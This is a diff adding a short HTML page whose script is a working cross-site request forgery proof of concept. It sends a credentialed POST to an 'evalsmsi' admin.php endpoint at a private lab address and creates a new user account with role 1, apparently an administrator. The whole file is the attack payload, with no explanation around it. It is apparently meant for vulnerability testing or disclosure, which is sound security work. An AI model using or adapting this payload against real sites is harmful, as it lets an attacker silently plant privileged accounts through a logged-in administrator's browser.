@@ -1,0 +1,13 @@
+<!doctype html>
+
+<html lang='en'>
+<body>
+<script>
+	var xhr = new XMLHttpRequest();
+	xhr.open('POST', 'http://192.168.56.50/site/evalsmsi/admin.php?action=record_user');
+	xhr.withCredentials = true;
+	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	xhr.send("prenom=ronan667&nom=ronan667&role=1&login=ronan667&passwd=ronan667&result%5B%5D=0");
+</script>
+</body>
+</html>
